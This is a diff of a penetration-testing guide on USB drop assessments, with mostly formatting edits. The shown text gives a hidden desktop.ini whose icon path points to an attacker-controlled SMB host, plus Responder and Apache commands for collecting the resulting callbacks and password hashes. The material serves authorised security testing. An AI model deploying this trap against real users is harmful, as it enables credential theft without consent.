@@ -349,12 +349,14 @@ File Preparation
 
 - Create a file titled “desktop.ini”
 - Place the below code in the file  
-`[.ShellClassInfo]  
-IconResource=\\<ATTACKING_IP>\<TARGET_COMPANY>?usb=<USB_DESCRIPTION>.ico,0`  
+``` [.ShellClassInfo]
+IconResource=\\<ATTACKING_IP>\<TARGET_COMPANY>?usb=<USB_DESCRIPTION>.ico,0
+```
   
 Example  
-`[.ShellClassInfo]  
-IconResource=\\1.2.3.4\Google?usb=LimeGreen.ico,0`  
+``` [.ShellClassInfo]
+IconResource=\\1.2.3.4\Google?usb=LimeGreen.ico,0
+```
 
 - Set file to be a "system" file and to be hidden  
 `attrib +s +h desktop.ini`  
@@ -369,9 +371,10 @@ If SMB isn’t allowed outbound you can look at the /var/log/apache2/access.log 
 Example entry:  
 ![USB Drop Callback](/assets/images/usb_drop_callback.jpg)  
 
-- Start responder on the attacking machine and wait for credentials to come in
+- Start responder on the attacking machine and wait for credentials to come in  
 `responder -I eth0`  
 If SMB is allowed out of the network, you should see authentication attempts which contain hash information.  
+
 Example Output:  
 ![Responder creds](/assets/images/usb_drop_responder.jpg)  
 
@@ -410,9 +413,10 @@ HTML file creation
 {: .notice--info}  
 
 Recieve Callbacks
-- Start web server on Kali
+- Start web server on Kali  
 `service apache2 start`  
 - You can review your apache logs at /var/log/apache2/access.log  
+
 ![USB Drop Callback HTML](/assets/images/usb_drop_callback_html.jpg)  
 
 Files  
@@ -429,7 +433,7 @@ In previous sections it’s mentioned hosting locations and how to receive callb
 
 Starting Apache  
 
-Once you’ve loaded Kali up and logged-in, go to your terminal and type the below  
+Once you’ve loaded Kali up and logged-in, go to your terminal and type the command below  
 
 `service apache2 start`  
 
@@ -460,7 +464,10 @@ Viewing Logs
 Viewing logs is a very important piece of our USB Drop Assessment, as it is what will show who accessed what and what time this occurred. It’s essentially the basis for the entire reporting piece. Instructions below will show you where the logs are and how to view them.  
 
 In your terminal type the following  
+
 `cat /var/logs/apache2/access.log`  
+
+Example:  
 ![Apache access log](/assets/images/access_log.jpg)  
 
 **Attacker Serves Content**  
